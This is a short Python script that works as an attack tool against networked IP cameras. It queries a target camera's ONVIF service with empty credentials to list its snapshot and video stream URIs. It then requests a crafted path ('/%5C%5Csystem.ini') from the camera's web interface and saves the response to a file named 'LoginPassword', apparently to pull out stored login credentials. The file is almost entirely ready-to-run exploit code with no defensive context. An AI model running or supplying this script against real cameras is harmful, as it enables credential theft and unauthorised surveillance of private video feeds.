#!/usr/bin/python3

import onvif
import requests
import argparse

def ONVIF(host, port):
	camera = onvif.ONVIFCamera(host, port, "", "", "./wsdl/")
	media_service = camera.create_media_service()

	profiles = media_service.GetProfiles()

	for profile in profiles:
		snapshot = media_service.create_type('GetSnapshotUri')
		snapshot.ProfileToken = profile.token
		output_snap_uri = media_service.GetSnapshotUri(snapshot)
		print(f"URI for snapshot: {output_snap_uri}")

	print(media_service.GetStreamUri({'StreamSetup':{'Stream':'RTP-Unicast','Transport':'UDP'},'ProfileToken':profile.token}))




parser = argparse.ArgumentParser()

parser.add_argument("--onvif", help="port of ONVIF service", type=int)
parser.add_argument("--host", help="IPv4 address of camera", required=True)
parser.add_argument("--port", help="port of web-interface", type=int, required=True)

args = parser.parse_args()

if args.onvif:
	ONVIF(args.host, args.onvif)

file = open("LoginPassword", "wb")

file.write(requests.get(f"http://{args.host}:{str(args.port)}/%5C%5Csystem.ini").content)
file.close()

#camera = onvif.ONVIFCamera(ip, port, usr, pas, "./wsdl/")
#media_service = camera.create_media_service()
#profiles = media_service.GetProfiles()


#for profile in profiles:
#	snapshot = media_service.create_type('GetSnapshotUri')
#	snapshot.ProfileToken = profile.token
#	output_snap_uri = media_service.GetSnapshotUri(snapshot)
#	print(f"URI for snapshot: {output_snap_uri}")

#print(media_service.GetStreamUri({'StreamSetup':{'Stream':'RTP-Unicast','Transport':'UDP'},'ProfileToken':profile.token}))

